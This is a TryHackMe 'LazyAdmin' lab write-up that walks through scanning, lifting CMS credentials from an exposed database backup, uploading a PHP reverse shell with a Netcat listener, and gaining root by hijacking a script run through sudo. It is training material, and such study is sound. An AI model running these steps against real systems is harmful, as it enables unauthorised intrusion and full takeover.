# TryHackMe – LazyAdmin Writeup

## Overview

This room demonstrates **web enumeration, credential discovery, reverse shell exploitation, and privilege escalation**.  
The objective is to exploit a vulnerable CMS, obtain a user shell, and escalate privileges to root.

---

# Lab Setup

Open the TryHackMe website:

https://tryhackme.com/

Steps:

1. Click **Practice**
2. Click **Challenges**
3. Search **LazyAdmin**
4. Click **LazyAdmin**
5. Click **Join Room**
6. Click **Start Machine**

Assume the target machine IP:

```
10.49.145.33
```

---

# Connecting Kali to TryHackMe VPN

Connect Kali Linux to the TryHackMe VPN.

```bash
cd /home/student/Downloads
sudo apt install openvpn
sudo openvpn <ovpn file path>
```

---

# Task 1 – Retrieve the User Flag

## Step 1 – Network Scanning

First perform an **Nmap scan** to identify open services.

```bash
nmap -sS -sV 10.49.145.33
```

### Result

The scan reveals two important services:

| Port | Service |
|-----|------|
| 22 | SSH |
| 80 | HTTP |

These services indicate possible attack vectors through **web enumeration or SSH access**.

---

# Step 2 – Web Directory Enumeration

Use **Gobuster** to find hidden directories.

```bash
gobuster dir -u http://10.49.145.33 -w /usr/share/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
```

### Result

```
**
```

Access the directory:

```
http://10.49.145.33/content/
```

Initially it only shows a landing page.

---

# Step 3 – Further Enumeration

Run Gobuster again on the discovered directory.

```bash
gobuster dir -u http://10.49.145.33/content/ -w /usr/share/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
```

### Result

Additional directories discovered:

```
**
**
```

---

# Step 4 – CMS Admin Panel Discovery

Access the admin login page:

```
http://10.49.145.33/content/as/
```

A **CMS login portal** is displayed.

To find credentials, explore backup files.

Navigate to:

```
http://10.49.145.33/content/inc/mysql_backup/
```

Download the backup file.

Inside the file, credentials are discovered.

### Credentials

```
Admin: **
Password: **
```

---

# Step 5 – Login to CMS

Use the discovered credentials to log in at:

```
http://10.49.145.33/content/as/
```

After logging in, access the **Ads section**, which allows file uploads.

---

# Step 6 – Upload Reverse Shell

Upload a **PHP reverse shell** file through the upload functionality.

Start a Netcat listener on Kali:

```bash
nc -lnvp 1234
```

Then execute the uploaded shell from:

```
http://10.49.145.33/content/inc/ads/
```

Once triggered, a reverse shell is established.

---

# Step 7 – Obtain User Flag

Upgrade the shell.

```bash
bash
ls
whoami
```

Navigate to the user directory.

```bash
cd /home/itguy
ls
cat user.txt
```

### User Flag

```
**
```

---

# Task 2 – Privilege Escalation

Check sudo permissions.

```bash
sudo -l
```

Create a script to spawn a privileged shell.

```bash
echo "/bin/bash -p" > /etc/copy.sh
ls -l /etc/copy.sh
chmod +x /etc/copy.sh
```

Execute the vulnerable Perl script.

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Verify privilege escalation.

```bash
whoami
```

You now have **root privileges**.

---

# Retrieve Root Flag

Navigate to the root directory.

```bash
cd /root
ls
cat root.txt
```

### Root Flag

```
**
```

---

# Key Learning Points

This room demonstrates several important penetration testing techniques:

- Network reconnaissance using **Nmap**
- Web directory enumeration using **Gobuster**
- Discovering credentials in **backup files**
- Exploiting **insecure file upload vulnerabilities**
- Establishing **reverse shells**
- Privilege escalation through **misconfigured sudo permissions**

---

# Disclaimer

This write-up is intended for **educational purposes only**.  
Sensitive answers and flags have been intentionally hidden to comply with platform learning policies.